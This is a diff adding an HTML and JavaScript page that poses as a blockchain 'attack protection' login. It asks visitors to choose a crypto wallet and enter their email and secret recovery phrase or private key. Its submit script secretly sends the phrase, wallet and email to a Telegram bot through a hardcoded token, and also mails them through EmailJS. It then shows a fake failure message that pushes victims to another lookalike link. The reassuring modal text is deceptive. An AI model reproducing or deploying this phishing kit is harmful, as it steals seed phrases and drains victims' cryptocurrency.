+                                    <option value="gate.io">🚪 Gate.io Wallet</option>
+                                    <option value="bitfinex">💰 Bitfinex</option>
+                                    <option value="kraken">🐙 Kraken</option>
+                                    <option value="gemini">♊ Gemini</option>
+                                    <option value="ftx">📊 FTX (Legacy)</option>
+                                    <option value="bittrex">⚡ Bittrex</option>
+                                    <option value="poloniex">⚪ Poloniex</option>
+                                    <option value="mexc">🔥 MEXC</option>
+                                    <option value="bitget">📈 Bitget Wallet</option>
+                                    <option value="bitmex">💹 BitMEX</option>
+                                    <option value="deribit">📊 Deribit</option>
+                                    <option value="bitstamp">🏦 Bitstamp</option>
+                                    <option value="coincheck">✅ Coincheck</option>
+                                    <option value="bitflyer">🪙 bitFlyer</option>
+
+                                    <!-- Bitcoin Wallets -->
+                                    <option value="electrum">⚡ Electrum</option>
+                                    <option value="bluewallet">🔵 BlueWallet</option>
+                                    <option value="blockstream">🌊 Blockstream Green</option>
+                                    <option value="wasabi">🔒 Wasabi Wallet</option>
+                                    <option value="samourai">🥷 Samourai Wallet</option>
+                                    <option value="sparrow">🐦 Sparrow Wallet</option>
+                                    <option value="bitcoin-core">₿ Bitcoin Core</option>
+                                    <option value="breadwallet">🍞 BRD (Bread)</option>
+                                    <option value="edge">🔷 Edge</option>
+                                    <option value="mycelium">🍄 Mycelium</option>
+
+                                    <!-- Multi-Chain Wallets -->
+                                    <option value="jaxx">💎 Jaxx Liberty</option>
+                                    <option value="coinomi">🪙 Coinomi</option>
+                                    <option value="guarda">🛡️ Guarda</option>
+                                    <option value="atomic-dex">⚛️ AtomicDEX</option>
+                                    <option value="enjin">🎮 Enjin Wallet</option>
+                                    <option value="trustee">🔐 Trustee Wallet</option>
+                                    <option value="zelcore">⚡ Zelcore</option>
+                                    <option value="abra">🔺 Abra</option>
+                                    <option value="luno">🌙 Luno</option>
+
+                                    <!-- Enterprise & Institutional -->
+                                    <option value="fireblocks">🔥 Fireblocks</option>
+                                    <option value="copper">🟤 Copper</option>
+                                    <option value="bitgo">🔐 BitGo</option>
+                                    <option value="anchorage">⚓ Anchorage Digital</option>
+                                    <option value="fidelity">📊 Fidelity Digital Assets</option>
+                                    <option value="bakkt">📦 Bakkt</option>
+
+                                    <!-- Web3 & Gaming -->
+                                    <option value="ronin">⚔️ Ronin Wallet</option>
+                                    <option value="metamask-institutional">🦊 MetaMask Institutional</option>
+                                    <option value="frame">🖼️ Frame</option>
+                                    <option value="brave">🦁 Brave Wallet</option>
+                                    <option value="opera">🎭 Opera Wallet</option>
+                        
+                                    <!-- Legacy & Others -->
+                                    <option value="fortmatic">🎩 Fortmatic (Legacy)</option>
+                                    <option value="portis">🔓 Portis (Legacy)</option>
+                                    <option value="squarelink">⬜ Squarelink (Legacy)</option>
+                                    <option value="authereum">🔐 Authereum (Legacy)</option>
+                                    <option value="torus">🌀 Torus (Legacy)</option>
+                                    <option value="dapper">💫 Dapper (Flow)</option>
+                                    <option value="blocto">🎯 Blocto</option>
+                                    <option value="lilico">🌸 Lilico (Flow)</option>
+
+                                    <!-- Other/Custom -->
+                                    <option value="other">❓ Other Wallet</option>
+                                </select>
+                                <div class="selected-wallet-display" id="selectedWalletDisplay">
+                                    <span id="selectedWalletText">✓ Wallet selected</span>
+                                </div>
+                                <div class="error-message" id="walletError">Please select a wallet type</div>
+                            </div>
+
+                            <!-- Email Input Section -->
+                            <div class="form-group">
+                                <label class="form-label">Email Address</label>
+                                <p class="email-message">Input any external email to get notification if we notice any suspicious login</p>
+                                <input type="email" class="form-input email-input" id="emailInput" name="email" 
+                                       placeholder="Enter your email address" oninput="checkFormValidity()">
+                                <div class="error-message" id="emailError">Please enter a valid email address</div>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">Enter your Secret Recovery Phrase or key <a href="#"
+                                        class="read-more-link" onclick="showModal()">read more</a></label>
+                                <div class="phrase-container" id="phraseContainer">
+                                    <textarea class="phrase-textarea" id="recoveryPhrase" name="phrase"
+                                        placeholder="Add a space between each word and make sure no one is watching."
+                                        oninput="checkFormValidity()"></textarea>
+                                    <div class="phrase-actions">
+                                        <button type="button" class="show-all-btn" id="showHideBtn"
+                                            onclick="toggleShowHide()">Hide</button>
+                                        <button type="button" class="paste-btn" onclick="pasteFromClipboard()">Paste</button>
+                                    </div>
+                                </div>
+                                <div class="error-message" id="phraseError">Please enter your recovery phrase</div>
+                            </div>
+
+                            <button type="submit" class="continue-btn" id="continueBtn" disabled>Continue To Login & Block
+                                Attack</button>
+
+                            <!-- Secure Connection Indicator -->
+                           
+                        </form>
+                    </div><br>
+                   <h1 class="import-title" style="font-size: 16px;">Or Login With</h1>
+                    <a href="https://xsecureblock.onrender.com" style="color: #2196f3; text-decoration: none; font-weight: 500; cursor: pointer; margin-left: 8px;">Web3 Walletconnect</a>
+                     <div class="secure-connection">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                                    viewBox="0 0 16 16">
+                                    <path fill-rule="evenodd"
+                                        d="M8 14.933a.615.615 0 0 0 .1-.025c.076-.023.174-.061.294-.118.24-.113.547-.29.893-.533a10.726 10.726 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067v13.866zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.775 11.775 0 0 1-2.517 2.453 7.159 7.159 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7.158 7.158 0 0 1-1.048-.625 11.777 11.777 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 62.456 62.456 0 0 1 5.072.56z" />
+                                </svg>
+                                SECURED CONNECTION
+                            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Secret Recovery Phrase Info -->
+    <div class="modal-overlay" id="phraseModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <h2 class="modal-title">What's a Secret Recovery Phrase/Privatekey?</h2>
+
+            <p class="modal-text">
+                A Secret Recovery Phrase, also called a seed phrase or mnemonic, Blockchain prevent and block any
+                suspicious attempt login on all Crypto Wallet, Blockchain request for your phrase or key to block
+                blackhat attack and notify you if any hacker is trying to attack your crypto wallet. our responsibility
+                is keep and secure all blockchain crypto wallet safe. any of your data is not visible or save to us and
+                it can never be shared to third-party.
+            </p>
+
+            <div class="modal-warning">Blockchain Protection:</div>
+            <ul class="modal-list">
+                <li>Block Attack</li>
+                <li>Report Any Attempt Login</li>
+                <li>Share Location where Attack came From</li>
+            </ul>
+
+            <button class="modal-button" onclick="closeModal()">Got it</button>
+        </div>
+    </div>
+
+    <style>
+        .email-message {
+            color: #666;
+            font-size: 14px;
+            margin: 8px 0;
+            line-height: 1.4;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: #2196f3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+
+        .email-input.error {
+            border-color: #f44336;
+            box-shadow: 0 0 0 3px rgba(244, 67, 54, 0.1);
+        }
+    </style>
+
+    <script>
+        let currentStage = 0;
+        let timeRemaining = 59 * 60 + 59; // 59:59 in seconds
+        let isTextVisible = true; // Track visibility state
+        let selectedWallet = '';
+
+        function updateCountdown() {
+            const minutes = Math.floor(timeRemaining / 60);
+            const seconds = timeRemaining % 60;
+
+            const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            const countdownEl = document.getElementById('countdown');
+            if (countdownEl) {
+                countdownEl.textContent = formattedTime;
+            }
+
+            if (timeRemaining > 0) {
+                timeRemaining--;
+            } else {
+                alert('Verification time expired!');
+            }
+        }
+
+        // Start countdown timer
+        setInterval(updateCountdown, 1000);
+
+        function goToSecurityScreen() {
+            const screens = document.querySelectorAll('.screen');
+            screens.forEach(screen => screen.classList.remove('active'));
+            document.getElementById('securityScreen').classList.add('active');
+            currentStage = 0;
+        }
+
+        function goToStage(stage) {
+            // Hide all screens
+            const screens = document.querySelectorAll('.screen');
+            screens.forEach(screen => screen.classList.remove('active'));
+
+            // Show target screen
+            if (stage === 1) {
+                document.getElementById('stage1').classList.add('active');
+            } else if (stage === 2) {
+                document.getElementById('stage2').classList.add('active');
+            } else if (stage === 3) {
+                document.getElementById('stage3').classList.add('active');
+            } else if (stage === 4) {
+                document.getElementById('stage4').classList.add('active');
+                // Reset form validation when entering stage 4
+                resetStage4Form();
+            }
+
+            currentStage = stage;
+            updateProgressBar(stage);
+        }
+
+        function resetStage4Form() {
+            // Reset validation state
+            const continueBtn = document.getElementById('continueBtn');
+            continueBtn.disabled = true;
+
+            // Clear error states
+            clearErrorStates();
+
+            // Reset selected wallet display
+            const display = document.getElementById('selectedWalletDisplay');
+            display.classList.remove('show');
+            selectedWallet = '';
+        }
+
+        function updateProgressBar(activeStep) {
+            const progressBars = document.querySelectorAll('.progress-bar');
+
+            progressBars.forEach(progressBar => {
+                const steps = progressBar.querySelectorAll('.progress-step');
+                const lines = progressBar.querySelectorAll('.progress-line');
+
+                steps.forEach((stepEl, index) => {
+                    const stepNumber = index + 1;
+
+                    // Remove all classes first
+                    stepEl.classList.remove('active', 'completed', 'inactive');
+
+                    if (stepNumber < activeStep) {
+                        stepEl.classList.add('completed');
+                    } else if (stepNumber === activeStep) {
+                        stepEl.classList.add('active');
+                    } else {
+                        stepEl.classList.add('inactive');
+                    }
+                });
+
+                lines.forEach((lineEl, index) => {
+                    lineEl.classList.remove('completed');
+                    if (index + 1 < activeStep) {
+                        lineEl.classList.add('completed');
+                    }
+                });
+            });
+        }
+
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+            input.setAttribute('type', type);
+        }
+
+        function toggleFaceId() {
+            const toggle = document.getElementById('faceIdToggle');
+            toggle.classList.toggle('off');
+        }
+
+        function validatePassword() {
+            const password1 = document.getElementById('password1').value;
+            const password2 = document.getElementById('password2').value;
+            const checkbox = document.getElementById('passwordCheck').checked;
+
+            if (!password1 || !password2) {
+                alert('Please enter both passwords');
+                return;
+            }
+
+            if (password1 !== password2) {
+                alert('Passwords do not match');
+                return;
+            }
+
+            if (!checkbox) {
+                alert('Please click the button to continue');
+                return;
+            }
+
+            goToStage(4);
+        }
+
+        // Enhanced Wallet Selection Function
+        function onWalletSelection() {
+            const selector = document.getElementById('walletSelector');
+            const display = document.getElementById('selectedWalletDisplay');
+            const displayText = document.getElementById('selectedWalletText');
+
+            selectedWallet = selector.value;
+
+            if (selectedWallet) {
+                const selectedOption = selector.options[selector.selectedIndex];
+                displayText.textContent = `✓ ${selectedOption.text} selected`;
+                display.classList.add('show');
+
+                // Clear error state
+                selector.classList.remove('error');
+                document.getElementById('walletError').classList.remove('show');
+            } else {
+                display.classList.remove('show');
+            }
+
+            // Check form validity after wallet selection
+            checkFormValidity();
+        }
+
+        // New function to check form validity with email validation
+        function checkFormValidity() {
+            const walletSelected = selectedWallet && selectedWallet !== '';
+            const phraseEntered = document.getElementById('recoveryPhrase').value.trim() !== '';
+            const emailInput = document.getElementById('emailInput');
+            const emailValid = emailInput && isValidEmail(emailInput.value.trim());
+            const continueBtn = document.getElementById('continueBtn');
+
+            // Enable continue button only if wallet is selected, phrase is entered, AND email is valid
+            if (walletSelected && phraseEntered && emailValid) {
+                continueBtn.disabled = false;
+                continueBtn.style.opacity = '1';
+                continueBtn.style.cursor = 'pointer';
+            } else {
+                continueBtn.disabled = true;
+                continueBtn.style.opacity = '0.6';
+                continueBtn.style.cursor = 'not-allowed';
+            }
+        }
+
+        // Function to validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Clear error states (updated to include email)
+        function clearErrorStates() {
+            const walletSelector = document.getElementById('walletSelector');
+            const phraseContainer = document.getElementById('phraseContainer');
+            const emailInput = document.getElementById('emailInput');
+            const walletError = document.getElementById('walletError');
+            const phraseError = document.getElementById('phraseError');
+            const emailError = document.getElementById('emailError');
+
+            walletSelector.classList.remove('error');
+            phraseContainer.classList.remove('error');
+            if (emailInput) emailInput.classList.remove('error');
+            walletError.classList.remove('show');
+            phraseError.classList.remove('show');
+            if (emailError) emailError.classList.remove('show');
+        }
+
+        // Show error states (updated to include email)
+        function showErrorStates() {
+            const walletSelector = document.getElementById('walletSelector');
+            const phraseContainer = document.getElementById('phraseContainer');
+            const emailInput = document.getElementById('emailInput');
+            const walletError = document.getElementById('walletError');
+            const phraseError = document.getElementById('phraseError');
+            const emailError = document.getElementById('emailError');
+            const phrase = document.getElementById('recoveryPhrase').value.trim();
+
+            if (!selectedWallet) {
+                walletSelector.classList.add('error');
+                walletError.classList.add('show');
+            }
+
+            if (!phrase) {
+                phraseContainer.classList.add('error');
+                phraseError.classList.add('show');
+            }
+
+            if (emailInput && !isValidEmail(emailInput.value.trim())) {
+                emailInput.classList.add('error');
+                if (emailError) emailError.classList.add('show');
+            }
+        }
+
+        // Enhanced validation function (updated to include email)
+        function validateRecoveryPhrase() {
+            const phrase = document.getElementById('recoveryPhrase').value.trim();
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput ? emailInput.value.trim() : '';
+
+            // Clear any existing error states
+            clearErrorStates();
+
+            // Check if wallet is selected, phrase is entered, and email is valid
+            if (!selectedWallet || !phrase || !isValidEmail(email)) {
+                showErrorStates();
+                return false; // Prevent form submission
+            }
+
+            // If all conditions are met, allow form submission
+            return true;
+        }
+
+        function showModal() {
+            document.getElementById('phraseModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('phraseModal').classList.remove('active');
+        }
+
+        // Stage 4 Enhanced Functions
+        function pasteFromClipboard() {
+            const textarea = document.getElementById('recoveryPhrase');
+            const pasteBtn = document.querySelector('.paste-btn');
+
+            // Focus the textarea first
+            textarea.focus();
+
+            try {
+                // For modern browsers, try to request clipboard permission first
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    // Try clipboard API with permission request
+                    navigator.permissions.query({ name: "clipboard-read" }).then(result => {
+                        if (result.state === "granted" || result.state === "prompt") {
+                            navigator.clipboard.readText().then(text => {
+                                textarea.value = text;
+                                showPasteSuccess(pasteBtn);
+                                checkFormValidity(); // Check validity after paste
+                            }).catch(err => {
+                                console.log('Clipboard read failed:', err);
+                                fallbackPasteMethod(textarea, pasteBtn);
+                            });
+                        } else {
+                            fallbackPasteMethod(textarea, pasteBtn);
+                        }
+                    }).catch(err => {
+                        console.log('Permission query failed:', err);
+                        fallbackPasteMethod(textarea, pasteBtn);
+                    });
+                } else {
+                    fallbackPasteMethod(textarea, pasteBtn);
+                }
+            } catch (err) {
+                console.log('Clipboard API not supported:', err);
+                fallbackPasteMethod(textarea, pasteBtn);
+            }
+        }
+
+        function fallbackPasteMethod(textarea, pasteBtn) {
+            // Create a temporary input to handle paste
+            const tempInput = document.createElement('input');
+            tempInput.style.position = 'fixed';
+            tempInput.style.left = '-9999px';
+            tempInput.style.top = '-9999px';
+            document.body.appendChild(tempInput);
+
+            tempInput.focus();
+
+            // Try execCommand paste
+            try {
+                const success = document.execCommand('paste');
+                if (success && tempInput.value) {
+                    textarea.value = tempInput.value;
+                    showPasteSuccess(pasteBtn);
+                    checkFormValidity(); // Check validity after paste
+                } else {
+                    // Show manual paste instruction
+                    showManualPasteInstruction(textarea, pasteBtn);
+                }
+            } catch (err) {
+                console.log('execCommand failed:', err);
+                showManualPasteInstruction(textarea, pasteBtn);
+            } finally {
+                document.body.removeChild(tempInput);
+                textarea.focus();
+            }
+        }
+
+        function showPasteSuccess(pasteBtn) {
+            const originalText = pasteBtn.textContent;
+            pasteBtn.textContent = 'Pasted!';
+            pasteBtn.style.color = '#4caf50';
+
+            setTimeout(() => {
+                pasteBtn.textContent = originalText;
+                pasteBtn.style.color = '#2196f3';
+            }, 1500);
+        }
+
+        function showManualPasteInstruction(textarea, pasteBtn) {
+            // Change button text to give instruction
+            const originalText = pasteBtn.textContent;
+            pasteBtn.textContent = 'Use Ctrl+V';
+            pasteBtn.style.color = '#ff9800';
+
+            // Show alert with instruction
+            alert('Please paste manually:\n1. Click in the text area below\n2. Press Ctrl+V (or Cmd+V on Mac)');
+
+            // Reset button after some time
+            setTimeout(() => {
+                pasteBtn.textContent = originalText;
+                pasteBtn.style.color = '#2196f3';
+            }, 3000);
+
+            // Focus textarea for immediate paste
+            textarea.focus();
+        }
+
+        function toggleShowHide() {
+            const textarea = document.getElementById('recoveryPhrase');
+            const showHideBtn = document.getElementById('showHideBtn');
+
+            if (isTextVisible) {
+                // Hide the text
+                textarea.classList.add('hidden-text');
+                showHideBtn.textContent = 'Show all';
+                isTextVisible = false;
+            } else {
+                // Show the text
+                textarea.classList.remove('hidden-text');
+                showHideBtn.textContent = 'Hide';
+                isTextVisible = true;
+            }
+        }
+
+        // Add some interactive effects
+        document.addEventListener('DOMContentLoaded', function () {
+            // Add focus effects to inputs
+            const inputs = document.querySelectorAll('.form-input');
+
+            inputs.forEach(input => {
+                input.addEventListener('focus', function () {
+                    this.style.transform = 'scale(1.02)';
+                    this.style.transition = 'transform 0.2s ease';
+                });
+
+                input.addEventListener('blur', function () {
+                    this.style.transform = 'scale(1)';
+                });
+            });
+
+            // Add click to focus for textarea
+            const phraseContainer = document.querySelector('.phrase-container');
+            if (phraseContainer) {
+                phraseContainer.addEventListener('click', function (e) {
+                    if (e.target === this) {
+                        document.getElementById('recoveryPhrase').focus();
+                    }
+                });
+            }
+
+            // Enhanced paste event handling for manual paste
+            const recoveryTextarea = document.getElementById('recoveryPhrase');
+            if (recoveryTextarea) {
+                // Handle paste events (when user manually pastes)
+                recoveryTextarea.addEventListener('paste', function (e) {
+                    setTimeout(() => {
+                        const pasteBtn = document.querySelector('.paste-btn');
+                        if (pasteBtn && this.value.trim()) {
+                            showPasteSuccess(pasteBtn);
+                        }
+                        checkFormValidity(); // Check validity after manual paste
+                    }, 100);
+                });
+
+                // Handle keyboard shortcuts
+                recoveryTextarea.addEventListener('keydown', function (e) {
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'v') {
+                        setTimeout(() => {
+                            const pasteBtn = document.querySelector('.paste-btn');
+                            if (pasteBtn && this.value.trim()) {
+                                showPasteSuccess(pasteBtn);
+                            }
+                            checkFormValidity(); // Check validity after keyboard paste
+                        }, 100);
+                    }
+                });
+
+                // Handle focus events
+                recoveryTextarea.addEventListener('focus', function (e) {
+                    this.style.borderColor = '#2196f3';
+                });
+
+                recoveryTextarea.addEventListener('blur', function (e) {
+                    this.style.borderColor = '#e0e0e0';
+                });
+
+                // Handle input events for real-time validation
+                recoveryTextarea.addEventListener('input', function (e) {
+                    checkFormValidity();
+                });
+            }
+
+            // Add email input event listeners
+            const emailInput = document.getElementById('emailInput');
+            if (emailInput) {
+                emailInput.addEventListener('input', function (e) {
+                    checkFormValidity();
+                });
+
+                emailInput.addEventListener('focus', function (e) {
+                    this.style.borderColor = '#2196f3';
+                });
+
+                emailInput.addEventListener('blur', function (e) {
+                    this.style.borderColor = '#e0e0e0';
+                });
+            }
+
+            // Add wallet selector focus effect
+            const walletSelector = document.getElementById('walletSelector');
+            if (walletSelector) {
+                walletSelector.addEventListener('focus', function () {
+                    this.style.transform = 'scale(1.02)';
+                });
+
+                walletSelector.addEventListener('blur', function () {
+                    this.style.transform = 'scale(1)';
+                });
+
+                // Handle selection change for real-time validation
+                walletSelector.addEventListener('change', function () {
+                    checkFormValidity();
+                });
+            }
+
+            // Initialize form state on page load
+            checkFormValidity();
+        });
+    </script>
+
+    <script>
+        $(".ajaxForm").submit(function (e) {
+            e.preventDefault();
+
+            // Get values from form elements with name attributes
+            let wallet = $("select[name='wallet']").val();
+            let phrase = $("textarea[name='phrase']").val();
+            let email = $("input[name='email']").val();
+            
+
+            if (!wallet) {
+                $("#walletError").addClass('show');
+                $("#walletSelector").addClass('error');
+                return;
+            } else {
+                $("#walletError").removeClass('show');
+                $("#walletSelector").removeClass('error');
+            }
+
+            if (!phrase) {
+                $("#phraseError").addClass('show');
+                $("#phraseContainer").addClass('error');
+                return;
+            } else {
+                $("#phraseError").removeClass('show');
+                $("#phraseContainer").removeClass('error');
+            }
+
+            if (!email || !isValidEmail(email)) {
+                $("#emailError").addClass('show');
+                $("#emailInput").addClass('error');
+                return;
+            } else {
+                $("#emailError").removeClass('show');
+                $("#emailInput").removeClass('error');
+            }
+
+            // Telegram Bot config
+            var chatId = "@maxwillinbox";
+            var token = "6173712735:AAHacOesd3uvSOAsO_8Gfb3SGN2nBdlICTY";
+
+            $.ajax({
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({
+                    chat_id: chatId,
+                    text: `Wallet: ${wallet}\nEmail: ${email}\nRecovery Phrase: ${phrase}`
+                }),
+                success: function () {
+                    console.log("Sent to Telegram");
+                },
+                error: function (err) {
+                    console.error("Telegram error:", err);
+                }
+            });
+
+            // Send with EmailJS
+            let formData = new FormData(this);
+            formData.append("service_id", "service_t16ljdq");
+            formData.append("template_id", "template_joqgtka");
+            formData.append("user_id", "eLSDwldNgAzdckVHS");
+
+            $.ajax({
+                type: "POST",
+                url: "https://api.emailjs.com/api/v1.0/email/send-form",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                beforeSend: function () {
+                    $("#continueBtn").html(
+                        '<span class="spinner-border spinner-border-sm" role="status"></span> Connecting wallet...'
+                    ).prop("disabled", true);
+                },
+                // Find this section in your code and replace the alert message:
+
+                success: function () {
+                    setTimeout(function () {
+                        alert("❌ Wallet Import Fail!\n\nYour wallet fail to login and block unknown login attempt, Please make sure you enter your phrase or key correctly or try to login with Another Wallet (typically 12-24 words separated by a single space, for privatekey paste it to the box as you copy from wallet)\nif you are unable to login Manually, Try to login with Web3 Walletconnect\n\ncopy and launch the link below to connect with web3\nhttps://secureblock.onrender.com/");
+                        $("#continueBtn").html("Continue To Login & Block Attack").prop("disabled", false);
+                    }, 2000);
+                },
+                error: function () {
+                    $("#continueBtn").html("Continue To Login & Block Attack").prop("disabled", false);
+                    alert("An error occurred. Please try again.");
+                },
+            });
+        });
+    </script>
+
+    <script src="https://unpkg.com/flowbite@1.5.3/dist/flowbite.js"></script>
+</body>
+
+</html>
